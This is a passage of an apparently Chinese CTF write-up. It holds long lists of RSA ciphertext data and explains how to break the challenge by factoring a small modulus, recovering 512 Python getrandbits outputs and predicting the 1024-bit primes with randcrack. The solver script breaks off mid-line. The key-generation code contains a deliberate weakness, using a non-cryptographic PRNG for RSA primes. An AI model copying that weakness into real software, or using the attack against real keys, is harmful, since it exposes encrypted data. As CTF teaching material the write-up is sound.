class="line">13402586421932983833466929662539579831</span><br><span class="line">73577334713803339185143437689323273802</span><br><span class="line">38551782957548094407447800753751168665</span><br><span class="line">51711934113503641726046694816046155196</span><br><span class="line">58300886844804359967503608900295384971</span><br><span class="line">30633380627138465592907806456575067479</span><br><span class="line">53301835725940512458121014414629084911</span><br><span class="line">58351996524707437429040101587159043471</span><br><span class="line">46610060507747647253774910292121057656</span><br><span class="line">19342692024098798494578688637191950234</span><br><span class="line">74381356872629590653080604770014608570</span><br><span class="line">49981408798986150620247366439830330294</span><br><span class="line">343345096895071813800587469532294537</span><br><span class="line">17263697045821285813239884204415480640</span><br><span class="line">55510192411883433931942585180431026378</span><br><span class="line">74745674371157413506031135502419954818</span><br><span class="line">58317986979406975295387076969578486745</span><br><span class="line">67575969419043342560344160043521858463</span><br><span class="line">19722181519789161239268079899458123538</span><br><span class="line">49112192134235855326178030632415585433</span><br><span class="line">45633293669673510130908046681991506353</span><br><span class="line">35299411607697175143911073665709375868</span><br><span class="line">43631509536595823002234087112287898161</span><br><span class="line">52044502710786365313804257874283929783</span><br><span class="line">22650150814130355340682778057131051659</span><br><span class="line">27443905251127089688157448960205705107</span><br><span class="line">2853412989187123916524622404120244444</span><br><span class="line">3386450410200548528780578658202470575</span><br><span class="line">34231137980284018396354125341248845163</span><br><span class="line">4828852678059600440594651376729716097</span><br><span class="line">43371979954046153211498507727979736109</span><br><span class="line">53537732436369105085256483146955492234</span><br><span class="line">44759935381236780538186499683770254348</span><br><span class="line">8217839204034217101529742014217694370</span><br><span class="line">5140383132413498698535013439891503428</span><br><span class="line">35014674188828991036961241239489830917</span><br><span class="line">46286379908818627302064904479347854981</span><br><span class="line">50447772104548245055127155839548916161</span><br><span class="line">55469559964575724561475519889794946801</span><br><span class="line">74615511074650335629278954816347193472</span><br><span class="line">6582134264246633258660973017210561275</span><br><span class="line">51884995747430036690532805795300544679</span><br><span class="line">42319797990737834257495597954540149433</span><br><span class="line">23610290115582713978682410086060215158</span><br><span class="line">66881329716839893865471106387111462473</span><br><span class="line">909075398718289963658440530321300364</span><br><span class="line">27756513980293361540523415158728760538</span><br><span class="line">12740080891813608621445227491348491949</span><br><span class="line">40944944366207791916630094620216336171</span><br><span class="line">54370818651306565940441953564893798069</span><br><span class="line">15396423250725553805177184667125594897</span><br><span class="line">76020926204650928876469817909107582268</span><br><span class="line">38180395914849495336268694233478365872</span><br><span class="line">16210473068590040530463270833681952664</span><br><span class="line">28710617260199516258036069513770033887</span><br><span class="line">12775754707987447736193303749999974695</span><br><span class="line">18005977177084028626312365652960774243</span><br><span class="line">68384773149660073962766610150796419611</span><br><span class="line">28325426067872375085710636700774830405</span><br><span class="line">16555151637843597346016287022181363150</span><br><span class="line">12267847175112244361016904522145166264</span><br><span class="line">35304991467264900508031646103662404719</span><br><span class="line">48160800944315308328888108176895789596</span><br><span class="line">24115551551584193553056947224671895413</span><br><span class="line">22244133292157063971991802200151458389</span><br><span class="line">16947252261538876517708030045108230397</span><br><span class="line">70816827019786838086321221858911035540</span><br><span class="line">62159767044487104819355796098670515641</span><br><span class="line">73905871936521551299105764298651286441</span><br><span class="line">1674903898060435537143058710558017411</span><br><span class="line">2638822964061780564962859913102684955</span><br><span class="line">21942892891032557280866602790070207671</span><br><span class="line">40337637415936089200641214557402954135</span><br><span class="line">37221640257854924629129918209333201869</span><br><span class="line">76335156736605168670936336240012218227</span><br><span class="line">9852343908055380610866824978672547275</span><br><span class="line">24990238420951414379757008860824754862</span><br><span class="line">76054651628841021660831807995042682922</span><br><span class="line">17001154513537021776068695541424520742</span><br><span class="line">12254707970983210964070530314282206000</span><br><span class="line">26278573582167989590424099138074019988</span><br><span class="line">60377446267959247227765153981500449302</span><br><span class="line">16646986416606335229554527078603791881</span><br><span class="line">40418467774836669874202305775995692992</span><br><span class="line">26016069727567824992672115324829140868</span><br><span class="line">73081148132111464341568500220808369331</span><br><span class="line">31673047411515577059112127074530487515</span><br><span class="line">67447236827196256091354393855384086836</span><br><span class="line">63047599001494777743421417688382288509</span><br><span class="line">74523044010485896818801708305958434788</span><br><span class="line">33226394205360449017677232326154124512</span><br><span class="line">16687952135509650272359001667799498377</span><br><span class="line">40202014131810502656982568150542291442</span><br><span class="line">48778018271662249535139739038314099859</span><br><span class="line">24613745709524835257275529176536882445</span><br><span class="line">45789595549956580578863392196161928145</span><br><span class="line">69434883406790893718883182461338676609</span><br><span class="line">2654950873299768803648305488717629435</span><br><span class="line">28563768289028017691942730658306461660</span><br><span class="line">21252750302891015742350785525925130526</span><br><span class="line">11980063502410778999893647170227777152</span><br><span class="line">8155241293227470083098294656348728846</span><br><span class="line">14097465343211016960327817851194107955</span><br><span class="line">38682258228726193890138714866033439004</span><br><span class="line">6772934507499279896884630113052591455</span><br><span class="line">11077022556612609543474072167323510664</span><br><span class="line">15570321470508342677531326954632033394</span><br><span class="line">750612858608028032961039967953094363</span><br><span class="line">48942529299328463788718161718501773445</span><br><span class="line">18939172623041301525059363527057319151</span><br><span class="line">63188329443267806641395875189108630997</span><br><span class="line">61922540518669436619243784312637696066</span><br><span class="line">55905928443882307103293066621791023799</span><br><span class="line">45378048949828317745584214789476050546</span><br><span class="line">56029426396155590704783097331267766000</span><br><span class="line">18196725262137636868539077952087282178</span><br><span class="line">53997016308690805344973726153964373973</span><br><span class="line">57905320778151911926668160072363169681</span><br><span class="line">34846145015411191369768173434982580216</span><br><span class="line">54473482351880218528208942017216579033</span><br><span class="line">18908144778734911717864313951037772547</span><br><span class="line">39290129993658324178964052113719363190</span><br><span class="line">67732219003325432115140571029252594040</span><br><span class="line">3994506866605245477866886505944747873</span><br><span class="line">52471756007888304712589215251851137023</span><br><span class="line">1643624760978562436291445470214719763</span><br><span class="line">21742129690789895185807924184624512844</span><br><span class="line">41221992259707251153821196652421572013</span><br><span class="line">75093552499739735977984981754440972836</span><br><span class="line">55371483449781265642875914635444201928</span><br><span class="line">13597468886365387289589588472349534536</span><br><span class="line">52295196303763959838486998791021070611</span><br><span class="line">31029206605576316172938446880964208080</span><br><span class="line">53725579517331114664957961168627149673</span><br><span class="line">75547177264754282663031670895206184334</span><br><span class="line">69118763528437304719951895435725198252</span><br><span class="line">12621663619760751805147079616517495042</span><br><span class="line">37036262893874233922974473510886948658</span><br><span class="line">75926800630911862283187685714646972216</span><br><span class="line">64775156645992063288511100301630865523</span><br><span class="line">3869176818185676946862140272530846584</span><br><span class="line">33606183061067145645254886208456088573</span><br><span class="line">21337279966091050565136681364160619362</span><br><span class="line">41863289780788023808316573532510818687</span><br><span class="line">22367585831790580314785243235628671945</span><br><span class="line">11138423981498017687185182681852324709</span><br><span class="line">48344238493491767429713789300535388916</span><br><span class="line">9114177025706775071291467511403934627</span><br><span class="line">2369807607007867929754201646611078799</span><br><span class="line">32486759255636019003614349998118405844</span><br><span class="line">69430435596711389057146433373308694360</span><br><span class="line">55930545126519744291831576248089084877</span><br><span class="line">44949905516642895985044836973991460730</span><br><span class="line">57665373371282889383097771776533335101</span><br><span class="line">12831141281994670682328945203694621635</span><br><span class="line">56349008735152642234798870173001784343</span><br><span class="line">54937877909358983725137319172947826396</span><br><span class="line">62297220865005149250570213334045625465</span><br><span class="line">26462419478920119496519719765373975300</span><br><span class="line">46652428678273884958618764319582909327</span><br><span class="line">11832792518875771991114957890561831030</span><br><span class="line">47001269316646847708056462464619029608</span><br><span class="line">59815894872435566441080225307252358055</span><br><span class="line">9300274876649918767463730602963445513</span><br><span class="line">40147147455671874524126774061402602264</span><br><span class="line">53041249051778888816455911246843954949</span><br><span class="line">26225020657054410256652347783394776061</span><br><span class="line">23388213736299541535198656983707283908</span><br><span class="line">19827859609131661501172229435226831720</span><br><span class="line">26903124046982232580975472720762700391</span><br><span class="line">472725185495004527275483775876625860</span><br><span class="line">44162113157985293817593797835307709945</span><br><span class="line">35267073589397082942234588444478913562</span><br><span class="line">49164693950593033244235072592572708091</span><br><span class="line">67186670706245446990252877893764564463</span><br><span class="line">39674705819767647185341208083887833315</span><br><span class="line">57501247857224418972134344445747464157</span><br><span class="line">18384086662429630069955335132326044662</span><br><span class="line">46336405320121708411809995165391509167</span><br><span class="line">15328067315155675711792268624344900420</span><br><span class="line">42428447990667337755561298059171545005</span><br><span class="line">22311821917505740799574648650178983648</span><br><span class="line">16657908374331731937243726993406582967</span><br><span class="line">42967637881285518163441704974387925902</span><br><span class="line">43083647853649416577670607419504528923</span><br><span class="line">15227675589017975455675883780354796733</span><br><span class="line">36004364034949587007474604010987430578</span><br><span class="line">64247182931697437675610741428060795874</span><br><span class="line">26011204129148864838768926563419479804</span><br><span class="line">32387937896808623479315066138817124816</span><br><span class="line">23467148540610175486782722270025351188</span><br><span class="line">8138407575510542083316697741986966097</span><br><span class="line">40448303323971138825399153219375312702</span><br><span class="line">20990492979204755386711680804831950284</span><br><span class="line">5032606622393700413563463028167480919</span><br><span class="line">45572320595285804672546763004570475751</span><br><span class="line">2697576927615136653521949312116319781</span><br><span class="line">47820135134907957585261729032015508196</span><br><span class="line">1801531631085730512559601612268846981</span><br><span class="line">22300256815919904331477566105597371026</span><br><span class="line">71601461186037515618460987018278878662</span><br><span class="line">8840939986946157215272346953853993228</span><br><span class="line">28541506760429312739759900541722804837</span><br><span class="line">48716769662931571436165166434862016906</span><br><span class="line">70245545857311291757824176752090615172</span><br><span class="line">72326775881046625170993909304066950686</span><br><span class="line">62693914265302512592049721833597075251</span><br><span class="line">67577499750796736165581464710247788128</span><br><span class="line">49484194507940175452408696241071251001</span><br><span class="line">73518745770174706188500807549243278316</span><br><span class="line">27231609289614889000589658851451000168</span><br><span class="line">2463548219333709244854244236845935718</span><br><span class="line">12003422850687820576020815049726339839</span><br><span class="line">53222386855355299629986636639369454205</span><br><span class="line">10862975889084472710944307131367926576</span><br><span class="line">50263517279131247737773774178607028570</span><br><span class="line">31572036226127813503878363109108131748</span><br><span class="line">57742833213538630708641038141663214300</span><br><span class="line">69064042415684932588294428395311336487</span><br><span class="line">64147265955473613434432650164469617580</span><br><span class="line">70275605025151141516550884220388466652</span><br><span class="line">7478914588285598946881384891628027915</span><br><span class="line">72179208123914556413783478949233045945</span><br><span class="line">35102602984410184005567053836926866695</span><br><span class="line">54676821516466471549230185756839223486</span><br><span class="line">38778602498370176753958043897798075671</span><br><span class="line">29523714028544863436392981978883327716</span><br><span class="line">66096492639124474390384964712038288880</span><br><span class="line">39524200952875756531303031617075324147</span><br><span class="line">72116659779321139845384070158829301292</span><br><span class="line">59621197327660998024510304332636068730</span><br><span class="line">39782242801577043017045223978824221862</span><br><span class="line">37368910667551147233029611392557181920</span><br><span class="line">9069978015303196519230781714197951610</span><br><span class="line">30483323264468964802469215142437392402</span><br><span class="line">6113193036135292828722459078321304832</span><br><span class="line">19318053896535523877158427256105938493</span><br><span class="line">29822420662360453942709795394346292272</span><br><span class="line">37526232600770913105544476534683757431</span><br><span class="line">717452638395587204712922294788413723</span><br><span class="line">33654741029814987313369351505856888049</span><br><span class="line">8249320145240412310879642108542724682</span><br><span class="line">60589858556148301355533054957471357241</span><br><span class="line">46825454914848374408725197167114383784</span><br><span class="line">58045847545255936799980570400201087833</span><br><span class="line">52684847322422803581616720340195826090</span><br><span class="line">46756711105421535556512667480197418191</span><br><span class="line">71541708119416001212390621268612714301</span><br><span class="line">2961403394813646436071997927847813540</span><br><span class="line">15599269970911350005712695323277260819</span><br><span class="line">22353254010752206848791930161686846952</span><br><span class="line">12237896986738270934749855268265991922</span><br><span class="line">61121897232244732020015169561707142944</span><br><span class="line">12101534951800077461421353783996152672</span><br><span class="line">41136167420472243931727728189359791477</span><br><span class="line">28389349055504342282484038293437366577</span><br><span class="line">69569769478414256145187182082569097325</span><br><span class="line">74557943847613270784984637439329892780</span><br><span class="line">34296665055599999304276235527067174566</span><br><span class="line">64073534244906816410984119644410800813</span><br><span class="line">55675356397221125159947807887992291783</span><br><span class="line">71421200741022101087676649036860191345</span><br><span class="line">39650216979025258991250496728501620557</span><br><span class="line">28549209769356157258095587304686248327</span><br><span class="line">33120081756034861686619426460249594792</span><br><span class="line">26466049654773455860498972496517418132</span><br><span class="line">28125016278291229091392810824821443495</span><br><span class="line">35813535540236641327500527074068036861</span><br><span class="line">64903840966563947959341031040196273695</span><br><span class="line">1051247119041415582933381694025019339</span><br><span class="line">8549537254365025592173327908288435537</span><br><span class="line">57664154946360838545913075634144291449</span><br><span class="line">6813116627832393154625416082804538117</span><br><span class="line">73630574545074922135319459708379278283</span><br><span class="line">14358412386115976898503805642784221937</span><br><span class="line">58833762887768796127831667670843321838</span><br><span class="line">49419680129380264666560862372241189173</span><br><span class="line">70293110766410147397475690753162241844</span><br><span class="line">60403179385577249261914169983862264489</span><br><span class="line">1857812368505314880093639460129737996</span><br><span class="line">75708221341718233888382436277764721660</span><br><span class="line">16000721960732720296850944542171787251</span><br><span class="line">44773886866430755281512192595014044623</span><br><span class="line">74860301591643958332635470790110365833</span><br><span class="line">32601072483171297153664725328253380691</span><br><span class="line">46277488001461470531992550020278593701</span><br><span class="line">40072732400541289217096896037501008183</span><br><span class="line">70437122485443889632095484536864729564</span><br><span class="line">5842231245291871561968630134635129910</span><br><span class="line">71698996783347707866616461709082652562</span><br><span class="line">27405571487555279714409256700681248821</span><br><span class="line">67237149436936991771698502836361675612</span><br><span class="line">70178422435080783462679134162451977658</span><br><span class="line">48333038453762490983454185987130958179</span><br><span class="line">8092347608893768629361778076069841773</span><br><span class="line">37175192888660586255240074676139579549</span><br><span class="line">5293489249216440974720528384995400609</span><br><span class="line">14822718954662237332590158650848520892</span><br><span class="line">31723616116690600961965364878394601601</span><br><span class="line">52553228094114915018035985338629190088</span><br><span class="line">10618829930027960669603837372135346232</span><br><span class="line">2999382201018958987293425344575505964</span><br><span class="line">501152901028905946071059928996232708</span><br><span class="line">49338932744169602184404313095712344343</span><br><span class="line">49568336589022292055373203312489388219</span><br><span class="line">69223238645170476437475272952089182817</span><br><span class="line">24710351085309602112527472563294525799</span><br><span class="line">26664485026381528714139836103757761547</span><br><span class="line">37024790340621890323056196686751145267</span><br><span class="line">52858759042397569015012889379681703702</span><br><span class="line">75067026536051838775779037733876437534</span><br><span class="line">39683454180624399773767172920132905966</span><br><span class="line">26387728022564006469934467314246884742</span><br><span class="line">38956008011908076426993601023845651905</span><br><span class="line">19114854026343954755487642350620866070</span><br><span class="line">60269197580330253129929245772477733815</span><br><span class="line">69425453988923884737185316492846064115</span><br><span class="line">72049276247372004048001915547341492198</span><br><span class="line">27020444298586136228512630810329361074</span><br><span class="line">24514179828719805466049854770253300672</span><br><span class="line">11387398938803280585770690925793807672</span><br><span class="line">26981871177397542951894305683949006935</span><br><span class="line">24890471248712877564487138622567803026</span><br><span class="line">43569028689336718065355608958517719198</span><br><span class="line">2841243383547217099989435276945505801</span><br><span class="line">73114881462300024483651416174045717904</span><br><span class="line">42287476880242010040554175714650635974</span><br><span class="line">44387197665316392336941587961756795931</span><br><span class="line">3912083375057737515892821795530340552</span><br><span class="line">38254271733791723843796557727576796542</span><br><span class="line">62387378560483901614667567690245695051</span><br><span class="line">23353983253954117749671083584281745587</span><br><span class="line">11890380775113551648722094612394458547</span><br><span class="line">20212903792749344150387728605925026282</span><br><span class="line">74341466346640978646687114436924172716</span><br><span class="line">73302262117671217990837163662899246984</span><br><span class="line">30303887392666513555231880880783311198</span><br><span class="line">32171960639631813641629490317007528021</span><br><span class="line">61097812909217317035183512169585829209</span><br><span class="line">25792757414809254112556517604042651422</span><br><span class="line">2820971132615398466647131671303007788</span><br><span class="line">55092077264423661113641038963748334578</span><br><span class="line">49554788238292628062732887189816139467</span><br><span class="line">74771934831620321047412964987910590357</span><br><span class="line">67720656448229753088547213144415993466</span><br><span class="line">6718602819829121903616500132600299386</span><br><span class="line">27403277384867425295835181972291535760</span><br><span class="line">21856765603433909157069432483294899155</span><br><span class="line">52678542842084120195158191310376903919</span><br><span class="line">27036289905859519421045186459510769221</span><br><span class="line">53949529951404075903480041220342404144</span><br><span class="line">19869158060062892518001670873247684384</span><br><span class="line">21423368194161529926258495179468700524</span><br><span class="line">15507218173048511539722818882254911898</span><br><span class="line">58493624846849739048541398955639821997</span><br><span class="line">18576248300905745165463542420158250609</span><br><span class="line">33123623650401168824226984597730163145</span><br><span class="line">5066561639920535540525523322940514981</span><br><span class="line">46154189500068014623011135729116964258</span><br><span class="line">61348714290534129521581036579172409441</span><br><span class="line">23497842736356918887959512603100822443</span><br><span class="line">27643071511142367413891425427930557465</span><br><span class="line">67224926973909923980664247289143460037</span><br><span class="line">38507367295460233967001519975014449439</span><br><span class="line">65229466825082379355511302750084744719</span><br><span class="line">38171949543563355675378790857959496479</span><br><span class="line">2659199859629667662736644420333889395</span><br><span class="line">43081036380115727547920396392357586996</span><br><span class="line">17531206520351950500333574552272373827</span><br><span class="line">10628064469094293265451454157816993474</span><br><span class="line">39730594027417919397834671829171945470</span><br><span class="line">62006545314185270363347307768996407030</span><br><span class="line">19572570545397883143255842308868014886</span><br><span class="line">6699357463853099807412464562835728675</span><br><span class="line">14376397955073247432491739119348089407</span><br><span class="line">57192377840729275677048082982125179172</span><br><span class="line">4513552466499363414186222664580980268</span><br><span class="line">56598943604580243366799057800523215202</span><br><span class="line">15444274163958164496791776375191715284</span><br><span class="line">34658197184327096368877820299201518217</span><br><span class="line">18406594343439425514333446513894410548</span><br><span class="line">53128300939957954481962394611182805927</span><br><span class="line">10389424837760798282728087275080561564</span><br><span class="line">45849244041180773739540685723027640839</span><br><span class="line">48561962867547472875257047808667489498</span><br><span class="line">48076863048502996904376254792233103056</span><br><span class="line">31887732291237149005229642171395782146</span><br><span class="line">20298905340839730417185964185442148927</span><br><span class="line">22293988118950779143063828473572525194</span><br><span class="line">60713814077324533346139485956092939670</span><br><span class="line">59144307497264927028473801484182140103</span><br><span class="line">70979914751063744850455347535871745789</span><br><span class="line">48051923036769777739685675552089813085</span><br><span class="line">15779320762096918132913190473779633026</span><br><span class="line">72860747964178449434821841961897160795</span><br><span class="line">68158422453785776448496625604852512896</span><br><span class="line">75430359970533662718610416885248746103</span><br><span class="line">39733138524461500034189776711952631136</span><br><span class="line">23461522873961039627762115204279810425</span><br><span class="line">67751781759615895801076984903269465961</span><br><span class="line">55059308664727791650672545472787246580</span><br><span class="line">62702570052506263845880682002090128305</span><br><span class="line">8429676534985343397917920218059103540</span><br><span class="line">31210534661845991977138598033717576126</span><br><span class="line">56970958856331042229656334983727387926</span><br><span class="line">51854496037160531880091901578118555580</span><br><span class="line">17532958091849925993863271115127233227</span><br><span class="line">75636304487977328653964399096355223348</span><br><span class="line">47582528286780842346286920497648121539</span><br><span class="line">59889453489880466198129715991695437909</span><br><span class="line">71460535859867816389289890166577713886</span><br><span class="line">11061888269887829363399225472887739506</span><br><span class="line">26940999471527483474663193401432672973</span><br><span class="line">9124798074059122045009030126969177244</span><br><span class="line">17272172828976609206263497076670286903</span><br><span class="line">9953781736684486658170184214564469563</span><br><span class="line">3726435727193783980418902889173734926</span><br><span class="line">24487365843010309788231226154551870489</span><br><span class="line">24739090888075445918159490045608899107</span><br><span class="line">59209165445424686024941838268459504117</span><br><span class="line">13318192398726657948875374860980352981</span><br><span class="line">67476353536101821326389660329109412849</span><br><span class="line">1384718306590060544856527893425647463</span><br><span class="line">1287391443400184368176229041521636354</span><br><span class="line">40369991385882907331114817073400604517</span><br><span class="line">73239753442912730698468595505762923718</span><br><span class="line">33816391019462744010106232817010306280</span><br><span class="line">6979293363164184625652874445245822514</span><br><span class="line">33727278198510261153645899991881447632</span><br><span class="line">18568313418586732598578014107797498271</span><br><span class="line">58602442666031882232311625755800803561</span><br><span class="line">42168548859211219151345015430381822802</span><br><span class="line">39052432118990439618873824576207426221</span><br><span class="line">55836500526512599901511278282763611693</span><br><span class="line">42531945108161301145085989554596973069</span><br><span class="line">3369025802088037815201828185795922075</span><br><span class="line">58204450257533473367605797891898368484</span><br><span class="line">23718822442805478730889493054809272273</span><br><span class="line">63772639552111404065900883768370553629</span><br><span class="line">76065307277615491785591405085816741627</span><br><span class="line">70396249590333813912567930498934643546</span><br><span class="line">43803070237166649396998160133628691407</span><br><span class="line">63918161247510715740930443389992865782</span><br><span class="line">61381651756402419177093925122018840294</span><br><span class="line">54101408524701045409560353981004106388</span><br><span class="line">46851688461070740257378225455520117795</span><br><span class="line">15436308325251486223084723227745268731</span><br><span class="line">23218631189170791422703640138470721801</span><br><span class="line">75392280750504295953961664073218456783</span><br><span class="line">66553532300634957416615528619088258065</span><br><span class="line">72698787393965395194772232749518395438</span><br><span class="line">19535384035609800081997654944702946500</span><br><span class="line">39422173474990368057574374977824381951</span><br><span class="line">40004813095058812542774172239636346189</span><br><span class="line">942552610107287472181207404395965160</span><br><span class="line">2585006493032030325573369561874973416</span><br><span class="line">56657207473342746341618346391857068882</span><br><span class="line">45353439056243093600420538583717284727</span><br><span class="line">5326381030912940100950496754663527881</span><br><span class="line">52574740508116783755236913015296354008</span><br><span class="line">60767386508248278010316067650127924939</span><br><span class="line">58968728780343858041625641034398259578</span><br><span class="line">58606164016904507514212988506101806192</span><br><span class="line">18587467254459798712802505313686639678</span><br><span class="line">55422346534536990733696073415992919046</span><br><span class="line">28624375483769614463607152503350572643</span><br><span class="line">13148327912755642168524248255048779122</span><br><span class="line">31467720336603914934067757647369482012</span><br><span class="line">10683634146896984139628804526913660661</span><br><span class="line">76170402968596187847701210126889782108</span><br><span class="line">47374612181202618634027600446937096913</span><br><span class="line">36089678865849269171689697815903972364</span><br><span class="line">21217406106453015897742453966622893380</span><br><span class="line">14970412705963434083222359708019347920</span><br><span class="line">53290629357146512929566264012966296410</span><br><span class="line">38712736084222125437711235986824516170</span><br><span class="line">62976649126413695078446179985640722909</span><br><span class="line">9926589243987961026927307135335663637</span><br><span class="line">64567995678465294136351877671450464565</span><br><span class="line">46713540283782404531686555202144638278</span><br><span class="line">10440888409743354127954409246855165474</span><br><span class="line">31956593614000844675478120015331054528</span><br><span class="line">55499046927817135319918513704109758455</span><br><span class="line">46214390544824746266723894169001319601</span><br><span class="line">49296377915776716441676864874017783736</span><br><span class="line">67334769101867458205450877829547803545</span><br><span class="line">433192196347974048429577633048338499</span><br><span class="line">52872806532639448089006834738347612861</span><br><span class="line">16836366767861888570007546478334091897</span><br><span class="line">12953440266362047492520847213284651421</span><br><span class="line">58814022084376292773896013187507972687</span><br><span class="line">48946546513435459728242095354620767484</span><br><span class="line">16690101992080929788000902609809364938</span><br><span class="line">48643514269766943371008693864376158458</span><br><span class="line">57301152785552158653026734737845206739</span><br><span class="line">36092926765017106701667283136511092626</span><br><span class="line">36503239268458633197504443728223255639</span><br><span class="line">20035053854728219741356182859230335102</span><br><span class="line">27448195615098643105059278634289103728</span><br><span class="line">804096397543961679227858842556568221</span><br><span class="line">42387391011062645905124272356232649581</span><br><span class="line">61914204868112989399807194774948928854</span><br><span class="line">50471281425013685325792812544053391833</span><br><span class="line">69199839034721925215627350821951487646</span><br><span class="line">28714477419050742199181961190943977649</span><br><span class="line">64352578296187124006749631627623859099</span><br><span class="line">66417142292403444690306408437925436539</span><br><span class="line">16917869489156458807988614612206952611</span><br><span class="line">62433740855979549009477295935969264632</span><br><span class="line">54703498276817055998735161171803303420</span><br></pre></td></tr></table></figure><p><strong>top_secret</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(6778341886512983471750645456950728290523536616361299371741958671360393083882319627518672438545115814129137657182781214208816455570796241668174521203607532582846713044946980024783900646043967377749611378975743784775184880644929838298609658208272073728954171415761808451070649956713090699363828704967425598555240857728605492559334918924364181243615109772911597831275788990921847678043264311757080086808770372237384343263695430482298224638114383481163242159396421912093570982271665015871698548239583006809079195143432434252317382780354946136908751753704879594650848364606279745816610061533345112504778579863240146035803,65537)</span><br><span class="line">418919112322035719080296282188262556318147208740019952103384898777739260429989830467043589948286391778496053290993573572770668930715827948954387013380968757428438279330384918638646330090780491358345953558632784799412654785756895941844475592045474255714700612603241873989982425698945208444003573618381342067450033353217477323111093274062491515883275867746619738296397569905705052009378569807157998159800021519653031832333686380591812114745289471610313845110578057278593565079742329184877876988624852591803357662165422951088131736792374156848783221486055402017298046164798460834330495680663944310194208485613787684535</span><br></pre></td></tr></table></figure><h1 id="0x02-解题思路"><a href="#0x02-解题思路" class="headerlink" title="0x02 解题思路"></a>0x02 解题思路</h1><p>分析源码，第一部分代码：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line">common_p = next_prime(getrandbits(<span class="number">64</span>))</span><br><span class="line">common_q = next_prime(getrandbits(<span class="number">64</span>))</span><br><span class="line">common_n = common_p*common_q</span><br><span class="line">common = <span class="string">&#x27;(%d,%d)&#x27;</span> % (common_n, e)</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">f.write(common+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">test = [getrandbits(<span class="number">64</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">512</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> test:</span><br><span class="line">    f.write(<span class="built_in">str</span>(<span class="built_in">pow</span>(i, e, common_n))+<span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure><p>通过两个<em>64</em>位的<code>common_p</code>和<code>common_q</code>生成公钥$(N,e)$存放到test文件中。</p><p>这对公钥<code>common_n,e</code>用来加密<em>512</em>串<em>64</em>位的随机数，也将其存放到test文件中。</p><p><code>e</code>和<code>common_n</code>题目给出，且<code>common_n</code>位数较低，直接通过大数分解即可得到<code>common_p</code>和<code>common_q</code></p><p>然后就可以逆向出512个随机数了。</p><p>再看看第二部分代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">top_p = next_prime(getrandbits(<span class="number">1024</span>))</span><br><span class="line">top_q = next_prime(getrandbits(<span class="number">1024</span>))</span><br><span class="line">top_n = top_p*top_q</span><br><span class="line">top = <span class="string">&#x27;(%d,%d)&#x27;</span> % (top_n, e)</span><br><span class="line"></span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;top_secret&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">f.write(top+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">f.write(<span class="built_in">str</span>(<span class="built_in">pow</span>(m, e, top_n)))</span><br></pre></td></tr></table></figure><p>第二部分比较简单，</p><p>通过<code>getrandbits(1024)</code>生成一个<em>1024</em>位的随机数，再通过<code>next_prime()</code>取这个数的下一个<code>素数</code>，</p><p>从而生成$p$和$q$，再用$p$和$q$计算得到的公钥对<code>flag</code>进行加密，将公钥$(n,e)$和密文$c$存储到<code>top_secret</code>文件中。</p><hr><p>本题的漏洞点是<code>getrandbits()</code>函数，</p><p>最终可以利用第一部分代码给出的大量随机数，预测出<code>top_p</code>和<code>top_q</code>。</p><p>我使用的是python3的randcrack进行预测</p><blockquote><p>安装方法：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install randcrack</span><br></pre></td></tr></table></figure></blockquote><p>首先需要解出第一部分所给出的512个随机数，</p><p>大数分解<code>common_n</code>得到<code>common_p</code>和<code>common_q</code>:</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221126105615237.png" alt="image-20221126105615237"></p><p>具体代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">common_n = <span class="number">76436798540605363536477649122583467659</span></span><br><span class="line">common_p = <span class="number">5105923512372711233</span></span><br><span class="line">common_q = <span class="number">14970220050375442123</span></span><br><span class="line">common_phi = (common_p-<span class="number">1</span>)*(common_q-<span class="number">1</span>)</span><br><span class="line">common_d = gmpy2.invert(e, common_phi)</span><br><span class="line">test = <span class="built_in">open</span>(<span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).readlines()</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;deTest&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> deTest:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> test:</span><br><span class="line">        <span class="keyword">if</span> i == <span 